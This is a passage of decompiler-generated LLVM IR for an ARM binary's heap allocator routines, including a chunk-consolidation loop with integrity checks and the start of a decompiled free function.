  %v3_1281430 = inttoptr i32 %v2_1281429 to i32*
  store i32 %v0_1281428, i32* %v3_1281430, align 4
  br label %dec_label_pc_12800.dec_label_pc_12800_crit_edge

dec_label_pc_126dc:                               ; preds = %entry
  %v1_126dc = and i32 %v2_126c4, -3
  %v3_126e0 = udiv i32 %v2_126c4, 8
  store i32 %v3_126e0, i32* %r2.global-to-local, align 4
  store i32 %v1_126dc, i32* %v1_126c4, align 4
  %v0_126e8 = load i32, i32* @r0, align 4
  %v1_126e8 = add i32 %v0_126e8, -4
  store i32 %v1_126e8, i32* %r3.global-to-local, align 4
  %v1_126ec = load i32, i32* %r2.global-to-local, align 4
  %v4_126ec = mul i32 %v1_126ec, 4
  %v5_126ec = add i32 %v4_126ec, %v1_126e8
  store i32 %v5_126ec, i32* %sb.global-to-local, align 4
  %v1_126f0 = add i32 %v0_126e8, 52
  store i32 %v1_126f0, i32* %r7.global-to-local, align 4
  %v1_126f4 = add i32 %v0_126e8, 4
  store i32 %v1_126f4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_126fc

dec_label_pc_126fc:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_126dc
  %v1_127f010 = phi i32 [ %v1_127f0, %dec_label_pc_127f8 ], [ %v5_126ec, %dec_label_pc_126dc ]
  %v1_12708 = phi i32 [ %v1_127f8, %dec_label_pc_127f8 ], [ %v1_126f4, %dec_label_pc_126dc ]
  %v1_126fc = inttoptr i32 %v1_12708 to i32*
  %v2_126fc = load i32, i32* %v1_126fc, align 4
  store i32 %v2_126fc, i32* %r1.global-to-local, align 4
  %v2_12700 = icmp eq i32 %v2_126fc, 0
  br i1 %v2_12700, label %dec_label_pc_127f0, label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_126fc
  %v0_12708 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12708, i32* %v1_126fc, align 4
  %v0_1270c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_127e4, %dec_label_pc_12708
  %v0_12728 = phi i32 [ %v0_127e4, %dec_label_pc_127e4 ], [ %v0_1270c.pre, %dec_label_pc_12708 ]
  %v1_1270c = add i32 %v0_12728, 4
  %v2_1270c = inttoptr i32 %v1_1270c to i32*
  %v3_1270c = load i32, i32* %v2_1270c, align 4
  store i32 %v3_1270c, i32* %r3.global-to-local, align 4
  %v1_12710 = and i32 %v3_1270c, -2
  store i32 %v1_12710, i32* %lr.global-to-local, align 4
  %v2_12714 = add i32 %v1_12710, %v0_12728
  store i32 %v2_12714, i32* @r0, align 4
  %v1_12718 = urem i32 %v3_1270c, 2
  %v2_12718 = icmp eq i32 %v1_12718, 0
  %v1_1271c = add i32 %v0_12728, 8
  %v2_1271c = inttoptr i32 %v1_1271c to i32*
  %v3_1271c = load i32, i32* %v2_1271c, align 4
  store i32 %v3_1271c, i32* %sl.global-to-local, align 4
  %v1_12720 = add i32 %v2_12714, 4
  %v2_12720 = inttoptr i32 %v1_12720 to i32*
  %v3_12720 = load i32, i32* %v2_12720, align 4
  store i32 %v3_12720, i32* %r8.global-to-local, align 4
  br i1 %v2_12718, label %dec_label_pc_12728, label %dec_label_pc_1275c

dec_label_pc_12728:                               ; preds = %dec_label_pc_1270c
  %v1_12728 = inttoptr i32 %v0_12728 to i32*
  %v2_12728 = load i32, i32* %v1_12728, align 4
  store i32 %v2_12728, i32* %r5.global-to-local, align 4
  %v2_1272c = sub i32 %v0_12728, %v2_12728
  store i32 %v2_1272c, i32* %r3.global-to-local, align 4
  %v1_12730 = add i32 %v2_1272c, 8
  %v2_12730 = inttoptr i32 %v1_12730 to i32*
  %v3_12730 = load i32, i32* %v2_12730, align 4
  store i32 %v3_12730, i32* %ip.global-to-local, align 4
  %v1_12734 = add i32 %v3_12730, 12
  %v2_12734 = inttoptr i32 %v1_12734 to i32*
  %v3_12734 = load i32, i32* %v2_12734, align 4
  store i32 %v3_12734, i32* %r1.global-to-local, align 4
  %v9_12738 = icmp eq i32 %v3_12734, %v2_1272c
  %v1_1273c = add i32 %v2_1272c, 12
  %v2_1273c = inttoptr i32 %v1_1273c to i32*
  %v3_1273c = load i32, i32* %v2_1273c, align 4
  store i32 %v3_1273c, i32* %r2.global-to-local, align 4
  br i1 %v9_12738, label %dec_label_pc_12744, label %dec_label_pc_127a0

dec_label_pc_12744:                               ; preds = %dec_label_pc_12728
  %v1_12744 = add i32 %v3_1273c, 8
  %v2_12744 = inttoptr i32 %v1_12744 to i32*
  %v3_12744 = load i32, i32* %v2_12744, align 4
  store i32 %v3_12744, i32* %r3.global-to-local, align 4
  %v9_12748 = icmp eq i32 %v3_12744, %v2_1272c
  br i1 %v9_12748, label %dec_label_pc_12750, label %dec_label_pc_127a0

dec_label_pc_12750:                               ; preds = %dec_label_pc_12744
  store i32 %v3_12730, i32* %v2_12744, align 4
  %v0_12754 = load i32, i32* %r2.global-to-local, align 4
  %v1_12754 = load i32, i32* %ip.global-to-local, align 4
  %v2_12754 = add i32 %v1_12754, 12
  %v3_12754 = inttoptr i32 %v2_12754 to i32*
  store i32 %v0_12754, i32* %v3_12754, align 4
  %v0_12758 = load i32, i32* %lr.global-to-local, align 4
  %v1_12758 = load i32, i32* %r5.global-to-local, align 4
  %v2_12758 = add i32 %v1_12758, %v0_12758
  store i32 %v2_12758, i32* %lr.global-to-local, align 4
  %v0_12760.pre = load i32, i32* @r0, align 4
  %v0_12764.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1275c

dec_label_pc_1275c:                               ; preds = %dec_label_pc_1270c, %dec_label_pc_12750
  %v0_127d4 = phi i32 [ %v1_12710, %dec_label_pc_1270c ], [ %v2_12758, %dec_label_pc_12750 ]
  %v0_12764 = phi i32 [ %v3_12720, %dec_label_pc_1270c ], [ %v0_12764.pre, %dec_label_pc_12750 ]
  %v1_12778 = phi i32 [ %v2_12714, %dec_label_pc_1270c ], [ %v0_12760.pre, %dec_label_pc_12750 ]
  %v0_1275c = load i32, i32* @r4, align 4
  %v1_1275c = add i32 %v0_1275c, 44
  %v2_1275c = inttoptr i32 %v1_1275c to i32*
  %v3_1275c = load i32, i32* %v2_1275c, align 4
  store i32 %v3_1275c, i32* %r3.global-to-local, align 4
  %v9_12760 = icmp eq i32 %v1_12778, %v3_1275c
  %v1_12764 = and i32 %v0_12764, -4
  store i32 %v1_12764, i32* %r5.global-to-local, align 4
  br i1 %v9_12760, label %dec_label_pc_127d4, label %dec_label_pc_1276c

dec_label_pc_1276c:                               ; preds = %dec_label_pc_1275c
  %v2_1276c = add i32 %v1_12778, %v1_12764
  store i32 %v2_1276c, i32* %r3.global-to-local, align 4
  %v1_12770 = add i32 %v2_1276c, 4
  %v2_12770 = inttoptr i32 %v1_12770 to i32*
  %v3_12770 = load i32, i32* %v2_12770, align 4
  store i32 %v3_12770, i32* %r3.global-to-local, align 4
  %v1_12774 = urem i32 %v3_12770, 2
  %v2_12774 = icmp eq i32 %v1_12774, 0
  %v2_12778 = add i32 %v1_12778, 4
  %v3_12778 = inttoptr i32 %v2_12778 to i32*
  store i32 %v1_12764, i32* %v3_12778, align 4
  br i1 %v2_12774, label %dec_label_pc_12780, label %dec_label_pc_1276c.dec_label_pc_127b0_crit_edge

dec_label_pc_1276c.dec_label_pc_127b0_crit_edge:  ; preds = %dec_label_pc_1276c
  %v0_127b4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127b0

dec_label_pc_12780:                               ; preds = %dec_label_pc_1276c
  %v0_12780 = load i32, i32* @r0, align 4
  %v1_12780 = add i32 %v0_12780, 8
  %v2_12780 = inttoptr i32 %v1_12780 to i32*
  %v3_12780 = load i32, i32* %v2_12780, align 4
  store i32 %v3_12780, i32* %ip.global-to-local, align 4
  %v1_12784 = add i32 %v3_12780, 12
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  store i32 %v3_12784, i32* %r3.global-to-local, align 4
  %v9_12788 = icmp eq i32 %v3_12784, %v0_12780
  %v1_1278c = add i32 %v0_12780, 12
  %v2_1278c = inttoptr i32 %v1_1278c to i32*
  %v3_1278c = load i32, i32* %v2_1278c, align 4
  store i32 %v3_1278c, i32* %r2.global-to-local, align 4
  br i1 %v9_12788, label %dec_label_pc_12794, label %dec_label_pc_127a0

dec_label_pc_12794:                               ; preds = %dec_label_pc_12780
  %v1_12794 = add i32 %v3_1278c, 8
  %v2_12794 = inttoptr i32 %v1_12794 to i32*
  %v3_12794 = load i32, i32* %v2_12794, align 4
  store i32 %v3_12794, i32* %r3.global-to-local, align 4
  %v9_12798 = icmp eq i32 %v3_12794, %v0_12780
  br i1 %v9_12798, label %dec_label_pc_127a4, label %dec_label_pc_127a0

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12780, %dec_label_pc_12744, %dec_label_pc_12728, %dec_label_pc_12794
  %v0_127a0 = call i32 @abort()
  store i32 %v0_127a0, i32* @r0, align 4
  %v0_127a4.pre = load i32, i32* @ip, align 4
  %v1_127a4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_127a4

dec_label_pc_127a4:                               ; preds = %dec_label_pc_12794, %dec_label_pc_127a0
  %v1_127a4 = phi i32 [ %v3_1278c, %dec_label_pc_12794 ], [ %v1_127a4.pre, %dec_label_pc_127a0 ]
  %v0_127a4 = phi i32 [ %v3_12780, %dec_label_pc_12794 ], [ %v0_127a4.pre, %dec_label_pc_127a0 ]
  %v2_127a4 = add i32 %v1_127a4, 8
  %v3_127a4 = inttoptr i32 %v2_127a4 to i32*
  store i32 %v0_127a4, i32* %v3_127a4, align 4
  %v0_127a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_127a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_127a8 = add i32 %v1_127a8, 12
  %v3_127a8 = inttoptr i32 %v2_127a8 to i32*
  store i32 %v0_127a8, i32* %v3_127a8, align 4
  %v0_127ac = load i32, i32* %lr.global-to-local, align 4
  %v1_127ac = load i32, i32* %r5.global-to-local, align 4
  %v2_127ac = add i32 %v1_127ac, %v0_127ac
  store i32 %v2_127ac, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_127b0

dec_label_pc_127b0:                               ; preds = %dec_label_pc_1276c.dec_label_pc_127b0_crit_edge, %dec_label_pc_127a4
  %v0_127b4 = phi i32 [ %v0_127b4.pre, %dec_label_pc_1276c.dec_label_pc_127b0_crit_edge ], [ %v2_127ac, %dec_label_pc_127a4 ]
  %v0_127b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_127b0 = add i32 %v0_127b0, 8
  %v2_127b0 = inttoptr i32 %v1_127b0 to i32*
  %v3_127b0 = load i32, i32* %v2_127b0, align 4
  store i32 %v3_127b0, i32* %r2.global-to-local, align 4
  %v1_127b4 = or i32 %v0_127b4, 1
  store i32 %v1_127b4, i32* %r3.global-to-local, align 4
  %v0_127b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_127b8, i32* %v2_127b0, align 4
  %v0_127bc = load i32, i32* %r1.global-to-local, align 4
  %v1_127bc = load i32, i32* %r2.global-to-local, align 4
  %v2_127bc = add i32 %v1_127bc, 12
  %v3_127bc = inttoptr i32 %v2_127bc to i32*
  store i32 %v0_127bc, i32* %v3_127bc, align 4
  %v0_127c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_127c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_127c0 = add i32 %v1_127c0, %v0_127c0
  %v4_127c0 = inttoptr i32 %v3_127c0 to i32*
  store i32 %v0_127c0, i32* %v4_127c0, align 4
  %v0_127c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_127c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_127c4 = add i32 %v1_127c4, 4
  %v3_127c4 = inttoptr i32 %v2_127c4 to i32*
  store i32 %v0_127c4, i32* %v3_127c4, align 4
  %v0_127c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_127c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_127c8 = add i32 %v1_127c8, 8
  %v3_127c8 = inttoptr i32 %v2_127c8 to i32*
  store i32 %v0_127c8, i32* %v3_127c8, align 4
  %v0_127cc = load i32, i32* %r7.global-to-local, align 4
  %v1_127cc = load i32, i32* %r1.global-to-local, align 4
  %v2_127cc = add i32 %v1_127cc, 12
  %v3_127cc = inttoptr i32 %v2_127cc to i32*
  store i32 %v0_127cc, i32* %v3_127cc, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_1275c
  %v2_127d4 = add i32 %v1_12764, %v0_127d4
  %v1_127d8 = or i32 %v2_127d4, 1
  store i32 %v1_127d8, i32* %r3.global-to-local, align 4
  %v1_127dc = load i32, i32* %r1.global-to-local, align 4
  %v2_127dc = add i32 %v1_127dc, 4
  %v3_127dc = inttoptr i32 %v2_127dc to i32*
  store i32 %v1_127d8, i32* %v3_127dc, align 4
  %v0_127e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_127e0 = load i32, i32* @r4, align 4
  %v2_127e0 = add i32 %v1_127e0, 44
  %v3_127e0 = inttoptr i32 %v2_127e0 to i32*
  store i32 %v0_127e0, i32* %v3_127e0, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127b0, %dec_label_pc_127d4
  %v0_127e4 = load i32, i32* %sl.global-to-local, align 4
  %v2_127e4 = icmp eq i32 %v0_127e4, 0
  store i32 %v0_127e4, i32* %r1.global-to-local, align 4
  br i1 %v2_127e4, label %dec_label_pc_127f0.loopexit, label %dec_label_pc_1270c

dec_label_pc_127f0.loopexit:                      ; preds = %dec_label_pc_127e4
  %v0_127f0.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_127f0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127f0.loopexit, %dec_label_pc_126fc
  %v1_127f0 = phi i32 [ %v1_127f0.pre, %dec_label_pc_127f0.loopexit ], [ %v1_127f010, %dec_label_pc_126fc ]
  %v0_127f8 = phi i32 [ %v0_127f0.pre, %dec_label_pc_127f0.loopexit ], [ %v1_12708, %dec_label_pc_126fc ]
  %v9_127f0 = icmp eq i32 %v0_127f8, %v1_127f0
  br i1 %v9_127f0, label %dec_label_pc_12868, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127f0
  %v1_127f8 = add i32 %v0_127f8, 4
  store i32 %v1_127f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_126fc

dec_label_pc_12800.dec_label_pc_12800_crit_edge:  ; preds = %dec_label_pc_12800.preheader, %dec_label_pc_12800.dec_label_pc_12800_crit_edge
  %v0_12800.pre = load i32, i32* @r4, align 4
  %v1_12800.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12800 = mul i32 %v1_12800.pre, 8
  %v5_12800 = add i32 %v4_12800, %v0_12800.pre
  %v1_12804 = add i32 %v1_12800.pre, 1
  store i32 %v1_12804, i32* %r2.global-to-local, align 4
  %v1_12808 = add i32 %v5_12800, 44
  store i32 %v1_12808, i32* %r3.global-to-local, align 4
  %v2_12810 = add i32 %v5_12800, 52
  %v3_12810 = inttoptr i32 %v2_12810 to i32*
  store i32 %v1_12808, i32* %v3_12810, align 4
  %v0_12814 = load i32, i32* %r3.global-to-local, align 4
  %v2_12814 = add i32 %v0_12814, 12
  %v3_12814 = inttoptr i32 %v2_12814 to i32*
  store i32 %v0_12814, i32* %v3_12814, align 4
  %v7_12818 = icmp sgt i32 %v1_12804, 95
  br i1 %v7_12818, label %dec_label_pc_1281c, label %dec_label_pc_12800.dec_label_pc_12800_crit_edge

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12800.dec_label_pc_12800_crit_edge
  %v0_1281c = load i32, i32* @r4, align 4
  %v1_1281c = inttoptr i32 %v0_1281c to i32*
  %v2_1281c = load i32, i32* %v1_1281c, align 4
  store i32 %v2_1281c, i32* %r2.global-to-local, align 4
  %v1_12820 = add i32 %v0_1281c, 864
  %v2_12820 = inttoptr i32 %v1_12820 to i32*
  %v3_12820 = load i32, i32* %v2_12820, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12828 = urem i32 %v2_1281c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12830 = or i32 %v3_12820, 1
  store i32 %v1_12830, i32* %r1.global-to-local, align 4
  %v1_12834 = or i32 %v1_12828, 72
  store i32 %v1_12834, i32* %r2.global-to-local, align 4
  %v1_12838 = add i32 %v0_1281c, 52
  store i32 %v1_12838, i32* %ip.global-to-local, align 4
  %v2_1283c = add i32 %v0_1281c, 840
  %v3_1283c = inttoptr i32 %v2_1283c to i32*
  store i32 0, i32* %v3_1283c, align 4
  %v0_12840 = load i32, i32* %r3.global-to-local, align 4
  %v1_12840 = add i32 %v0_12840, 65536
  store i32 %v1_12840, i32* %r3.global-to-local, align 4
  %v0_12844 = load i32, i32* %r0.global-to-local, align 4
  %v1_12844 = load i32, i32* @r4, align 4
  %v2_12844 = add i32 %v1_12844, 836
  %v3_12844 = inttoptr i32 %v2_12844 to i32*
  store i32 %v0_12844, i32* %v3_12844, align 4
  %v0_12848 = load i32, i32* %r0.global-to-local, align 4
  %v1_12848 = load i32, i32* @r4, align 4
  %v2_12848 = add i32 %v1_12848, 844
  %v3_12848 = inttoptr i32 %v2_12848 to i32*
  store i32 %v0_12848, i32* %v3_12848, align 4
  %v1_1284c = load i32, i32* @r4, align 4
  %v2_1284c = add i32 %v1_1284c, 852
  %v3_1284c = inttoptr i32 %v2_1284c to i32*
  store i32 %v1_12840, i32* %v3_1284c, align 4
  %v1_12850 = load i32, i32* @r4, align 4
  %v2_12850 = add i32 %v1_12850, 864
  %v3_12850 = inttoptr i32 %v2_12850 to i32*
  store i32 %v1_12830, i32* %v3_12850, align 4
  %v1_12854 = load i32, i32* @r4, align 4
  %v2_12854 = inttoptr i32 %v1_12854 to i32*
  store i32 %v1_12834, i32* %v2_12854, align 4
  %v0_12858 = load i32, i32* %ip.global-to-local, align 4
  %v1_12858 = load i32, i32* @r4, align 4
  %v2_12858 = add i32 %v1_12858, 44
  %v3_12858 = inttoptr i32 %v2_12858 to i32*
  store i32 %v0_12858, i32* %v3_12858, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12860 = call i32 @sysconf(i32 30, i32 %v1_12830, i32 %v1_12834, i32 %v1_12840)
  store i32 %v4_12860, i32* @r0, align 4
  %v1_12864 = load i32, i32* @r4, align 4
  %v2_12864 = add i32 %v1_12864, 860
  %v3_12864 = inttoptr i32 %v2_12864 to i32*
  store i32 %v4_12860, i32* %v3_12864, align 4
  br label %dec_label_pc_12868

dec_label_pc_12868:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_1281c
  %v2_1286c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1286c, i32* @r4, align 4
  %v1_12870 = load i32, i32* @r0, align 4
  ret i32 %v1_12870

; uselistorder directives
  uselistorder i32 %v0_1281c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12814, { 1, 0 }
  uselistorder i32 %v1_127f8, { 1, 0 }
  uselistorder i32 %v0_127e4, { 0, 2, 1 }
  uselistorder i32 %v0_127c0, { 1, 0 }
  uselistorder i32 %v1_12710, { 1, 0, 2 }
  uselistorder i32 %v0_12728, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_126e8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12868, { 1, 0 }
  uselistorder label %dec_label_pc_12800.dec_label_pc_12800_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_127e4, { 1, 0 }
  uselistorder label %dec_label_pc_127b0, { 1, 0 }
  uselistorder label %dec_label_pc_127a4, { 1, 0 }
  uselistorder label %dec_label_pc_127a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1275c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12874 = load i32, i32* @r4, align 4
  %v6_12874 = load i32, i32* @r5, align 4
  %v9_12874 = load i32, i32* @r6, align 4
  %v12_12874 = load i32, i32* @r7, align 4
  %v18_12874 = load i32, i32* @lr, align 4
  %v0_1287c = load i32, i32* @r0, align 4
  store i32 %v0_1287c, i32* @r6, align 4
  %v2_1287c = icmp eq i32 %v0_1287c, 0
  %v2_12880 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r7, align 4
  br i1 %v2_1287c, label %dec_label_pc_12a88, label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12890 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 108) to i32*), align 4
  store i32 %v4_12890, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12890, i32* %r2.global-to-local, align 4
  %v4_1289c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), align 4
  store i32 %v4_1289c, i32* %r1.global-to-local, align 4
  store i32 %v2_12880, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_128a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  store i32 %v4_128a8, i32* %ip.global-to-local, align 4
  store i32 75956, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128a8)
  %v0_128b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_128b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_128bc = load i32, i32* @r7, align 4
  %v2_128bc = add i32 %v0_128bc, 16
  %v3_128bc = inttoptr i32 %v2_128bc to i32*
  %v4_128bc = load i32, i32* %v3_128bc, align 4
  store i32 %v4_128bc, i32* %ip.global-to-local, align 4
  store i32 75976, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_128bc)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_128cc = load i32, i32* @r7, align 4
  %v2_128cc = add i32 %v0_128cc, 64
  %v3_128cc = inttoptr i32 %v2_128cc to i32*
  %v4_128cc = load i32, i32* %v3_128cc, align 4
  store i32 %v4_128cc, i32* @lr, align 4
  %v0_128d0 = load i32, i32* @r6, align 4
  %v1_128d0 = add i32 %v0_128d0, -4
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* %r2.global-to-local, align 4
  %v1_128d4 = inttoptr i32 %v4_128cc to i32*
  %v2_128d4 = load i32, i32* %v1_128d4, align 4
  store i32 %v2_128d4, i32* %r3.global-to-local, align 4
  %v1_128d8 = and i32 %v3_128d0, -4
  store i32 %v1_128d8, i32* %ip.global-to-local, align 4
  %v1_128dc = add i32 %v0_128d0, -8
  store i32 %v1_128dc, i32* @r5, align 4
  store i32 %v1_128dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_128d8, %v2_128d4
  br i1 %tmp, label %dec_label_pc_1290c, label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %dec_label_pc_1288c
  %v1_128ec = or i32 %v2_128d4, 3
  store i32 %v1_128ec, i32* %r3.global-to-local, align 4
  store i32 %v1_128ec, i32* %v1_128d4, align 4
  %v3_128f0 = load i32, i32* @lr, align 4
  %v4_128f0 = add i32 %v3_128f0, -8
  store i32 %v4_128f0, i32* %lr.global-to-local, align 4
  %v0_128f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_128f4 = udiv i32 %v0_128f4, 8
  store i32 %v3_128f4, i32* %r1.global-to-local, align 4
  %v1_128f8 = add i32 %v3_128f0, -4
  store i32 %v1_128f8, i32* %r2.global-to-local, align 4
  %v4_128fc = mul nuw i32 %v3_128f4, 4
  %v5_128fc = add i32 %v4_128fc, %v1_128f8
  %v6_128fc = inttoptr i32 %v5_128fc to i32*
  %v7_128fc = load i32, i32* %v6_128fc, align 4
  store i32 %v7_128fc, i32* %r3.global-to-local, align 4
  %v1_12900 = load i32, i32* @r5, align 4
  %v2_12900 = add i32 %v1_12900, 8
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  store i32 %v7_128fc, i32* %v3_12900, align 4
  %v0_12904 = load i32, i32* @r5, align 4
  %v1_12904 = load i32, i32* %r2.global-to-local, align 4
  %v2_12904 = load i32, i32* %r1.global-to-local, align 4
  %v5_12904 = mul i32 %v2_12904, 4
  %v6_12904 = add i32 %v5_12904, %v1_12904
  %v7_12904 = inttoptr i32 %v6_12904 to i32*
  store i32 %v0_12904, i32* %v7_12904, align 4
  br label %dec_label_pc_12a70

dec_label_pc_1290c:                               ; preds = %dec_label_pc_1288c
  %v1_1290c = and i32 %v3_128d0, 2
  %v2_1290c = icmp eq i32 %v1_1290c, 0
  br i1 %v2_1290c, label %dec_label_pc_12914, label %dec_label_pc_12a48

dec_label_pc_12914:                               ; preds = %dec_label_pc_1290c
  %v1_12914 = or i32 %v2_128d4, 1
  store i32 %v1_12914, i32* %r3.global-to-local, align 4
  store i32 %v1_12914, i32* %v1_128d4, align 4
  %v0_1291c = load i32, i32* @r6, align 4
  %v1_1291c = add i32 %v0_1291c, -4
  %v2_1291c = inttoptr i32 %v1_1291c to i32*
  %v3_1291c = load i32, i32* %v2_1291c, align 4
  store i32 %v3_1291c, i32* %r3.global-to-local, align 4
  %v0_12920 = load i32, i32* @r5, align 4
  %v1_12920 = load i32, i32* %ip.global-to-local, align 4
  %v2_12920 = add i32 %v1_12920, %v0_12920
  store i32 %v2_12920, i32* %lr.global-to-local, align 4
  %v1_12924 = urem i32 %v3_1291c, 2
  %v2_12924 = icmp eq i32 %v1_12924, 0
  %v1_12928 = add i32 %v2_12920, 4
  %v2_12928 = inttoptr i32 %v1_12928 to i32*
  %v3_12928 = load i32, i32* %v2_12928, align 4
  store i32 %v3_12928, i32* %r8.global-to-local, align 4
  br i1 %v2_12924, label %dec_label_pc_12930, label %dec_label_pc_12964

dec_label_pc_12930:                               ; preds = %dec_label_pc_12914
  %v1_12930 = add i32 %v0_1291c, -8
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  store i32 %v3_12930, i32* %r1.global-to-local, align 4
  %v2_12934 = sub i32 %v0_12920, %v3_12930
  store i32 %v2_12934, i32* %r3.global-to-local, align 4
  %v1_12938 = add i32 %v2_12934, 8
  %v2_12938 = inttoptr i32 %v1_12938 to i32*
  %v3_12938 = load i32, i32* %v2_12938, align 4
  store i32 %v3_12938, i32* %r2.global-to-local, align 4
  %v1_1293c = add i32 %v3_12938, 12
  %v2_1293c = inttoptr i32 %v1_1293c to i32*
  %v3_1293c = load i32, i32* %v2_1293c, align 4
  store i32 %v3_1293c, i32* %r4.global-to-local, align 4
  %v9_12940 = icmp eq i32 %v3_1293c, %v2_12934
  %v1_12944 = add i32 %v2_12934, 12
  %v2_12944 = inttoptr i32 %v1_12944 to i32*
  %v3_12944 = load i32, i32* %v2_12944, align 4
  store i32 %v3_12944, i32* %r0.global-to-local, align 4
  br i1 %v9_12940, label %dec_label_pc_1294c, label %dec_label_pc_129b0

dec_label_pc_1294c:                               ; preds = %dec_label_pc_12930
  %v1_1294c = add i32 %v3_12944, 8
  %v2_1294c = inttoptr i32 %v1_1294c to i32*
  %v3_1294c = load i32, i32* %v2_1294c, align 4
  store i32 %v3_1294c, i32* %r3.global-to-local, align 4
  %v9_12950 = icmp eq i32 %v3_1294c, %v2_12934
  br i1 %v9_12950, label %dec_label_pc_12958, label %dec_label_pc_129b0

dec_label_pc_12958:                               ; preds = %dec_label_pc_1294c
  store i32 %v3_12938, i32* %v2_1294c, align 4
  %v0_1295c = load i32, i32* %r0.global-to-local, align 4
  %v1_1295c = load i32, i32* %r2.global-to-local, align 4
  %v2_1295c = add i32 %v1_1295c, 12
  %v3_1295c = inttoptr i32 %v2_1295c to i32*
  store i32 %v0_1295c, i32* %v3_1295c, align 4
  %v0_12960 = load i32, i32* %ip.global-to-local, align 4
  %v1_12960 = load i32, i32* %r1.global-to-local, align 4
  %v2_12960 = add i32 %v1_12960, %v0_12960
  store i32 %v2_12960, i32* %ip.global-to-local, align 4
  %v0_12970.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12974.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_12914, %dec_label_pc_12958
